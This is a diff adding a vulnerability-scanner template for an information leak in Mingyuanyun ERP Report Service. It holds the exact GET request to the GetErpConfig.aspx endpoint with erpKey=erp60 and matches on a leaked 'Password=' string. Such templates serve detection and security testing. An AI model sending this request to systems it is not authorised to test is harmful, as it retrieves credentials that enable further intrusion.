@@ -1,0 +1,36 @@
+id: mingyuanyun-erp-geterpconfig-info-leak
+info:
+  name: Mingyuanyun ERP Report Service GetErpConfig Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+  description: |
+    This template detects an information leakage vulnerability in Mingyuanyun ERP Report Service through the GetErpConfig endpoint.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "报表服务已正常运行"
+  - method: GET
+    path:
+      - "{{BaseURL}}/service/Mysoft.Report.Web.Service.Base/GetErpConfig.aspx?erpKey=erp60"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"ErpKey\":\"erp60\""
+          - "Password="
+      - type: word
+        part: header
+        words:
+          - "application/json"
